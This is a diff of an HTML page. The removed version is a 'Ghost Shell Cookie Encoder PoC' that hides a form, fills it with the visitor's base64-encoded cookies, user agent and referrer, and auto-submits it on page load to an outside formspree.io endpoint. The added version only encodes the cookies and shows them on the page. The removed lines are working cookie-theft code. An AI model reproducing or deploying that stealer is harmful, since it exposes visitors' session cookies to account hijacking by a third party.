@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ghost Shell Cookie Encoder PoC</title>
+    <title>Encoded Cookie Test</title>
     <style>
         body {
             background-color: black;
@@ -20,44 +20,44 @@
             color: gold;
             text-shadow: 0 0 10px rgba(255, 215, 0, 0.8);
         }
-        form {
-            display: none;
-        }
     </style>
 </head>
 <body>
 
-    <h2>Ghost Shell Cookie Encoder PoC</h2>
-
-    <form id="stealthForm" action="https://formspree.io/f/xeoqzkqe" method="POST">
-        <input type="hidden" name="cookie_data" id="cookieField" value="">
-        <input type="hidden" name="user_agent" id="userAgentField" value="">
-        <input type="hidden" name="referrer" id="referrerField" value="">
-        <input type="hidden" name="fallback" value="not_empty">
-        <button type="submit">Send</button>
-    </form>
+    <h2>Encoded Cookie Tester</h2>
+    <p id="encodedResults"></p>
 
     <script>
         document.addEventListener("DOMContentLoaded", function() {
+            var cookies = document.cookie || "No_Cookies";
+
+            // Base64 Encoding
             function encodeBase64(str) {
                 return btoa(unescape(encodeURIComponent(str)));
             }
 
+            // URL Encoding
             function encodeURL(str) {
                 return encodeURIComponent(str);
             }
 
-            var cookies = document.cookie || "No_Cookies";
-            var userAgent = navigator.userAgent || "Unknown_User_Agent";
-            var referrer = document.referrer || "No_Referrer";
-
-            document.getElementById("cookieField").value = encodeBase64(cookies);
-            document.getElementById("userAgentField").value = encodeURL(userAgent);
-            document.getElementById("referrerField").value = encodeURL(referrer);
-
-            if (cookies !== "No_Cookies" || referrer !== "No_Referrer") {
-                document.getElementById("stealthForm").submit();
+            // Hex Encoding
+            function encodeHex(str) {
+                return Array.from(str).map(char => char.charCodeAt(0).toString(16).padStart(2, '0')).join('');
             }
+
+            var encodedCookies = {
+                "Base64": encodeBase64(cookies),
+                "URL Encoded": encodeURL(cookies),
+                "Hex Encoded": encodeHex(cookies)
+            };
+
+            // Display encoded cookies on page
+            document.getElementById("encodedResults").innerHTML = `
+                <strong>Base64:</strong> ${encodedCookies["Base64"]} <br>
+                <strong>URL Encoded:</strong> ${encodedCookies["URL Encoded"]} <br>
+                <strong>Hex Encoded:</strong> ${encodedCookies["Hex Encoded"]}
+            `;
         });
     </script>
 
